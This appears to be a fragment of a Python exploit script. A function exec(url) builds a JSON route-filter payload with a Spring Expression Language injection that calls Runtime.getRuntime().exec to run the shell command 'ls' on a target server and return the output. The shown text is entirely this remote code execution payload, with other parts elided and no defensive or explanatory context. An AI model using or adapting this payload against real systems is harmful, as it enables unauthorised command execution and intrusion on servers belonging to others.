...
def exec(url):
    ...
    payload = '''{\r
      ...
      "filters": [{\r
        ...
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"ls\\"}).getInputStream()))}"}\r
        }],\r
